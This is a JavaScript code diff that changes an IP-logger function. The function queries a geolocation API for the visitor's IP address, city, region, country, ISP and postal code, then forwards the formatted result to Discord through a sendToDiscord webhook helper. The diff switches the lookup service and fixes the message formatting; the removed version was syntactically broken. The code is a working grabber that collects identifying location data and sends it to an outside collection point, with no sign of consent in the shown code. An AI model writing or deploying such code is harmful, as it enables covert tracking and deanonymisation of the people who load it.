@@ -1,23 +1,21 @@
 // Function to fetch IP address and location and send to Discord
 async function getIPAndLocationAndSendToDiscord() {
     try {
-        const response = await fetch('http://ip-api.com/json');
+        const response = await fetch('https://freegeoip.app/json/');
         if (!response.ok) {
             throw new Error('Failed to fetch IP information');
         }
         const data = await response.json();
         
         // Construct the message with content in a code block
-        const message = "```json\n" +
-                        JSON.stringify(
-                            "City": data.city,
-                            "Region": data.regionName,
-                            "Country": data.country,
-                            "Internet Provider": data.org,
-                            "Postal Code": data.zip,
-                            "IP Address": data.query
-                        , null, 2) +
-                        "\n```";
+        const message = "```\n" +
+                        "City: " + data.city + "\n" +
+                        "Region: " + data.region_name + "\n" +
+                        "Country: " + data.country_name + "\n" +
+                        "Internet Provider: " + data.org + "\n" +
+                        "Postal Code: " + data.zip_code + "\n" +
+                        "IP Address: " + data.ip + "\n" +
+                        "```";
         
         // Send the message to Discord using a webhook
         await sendToDiscord(message);
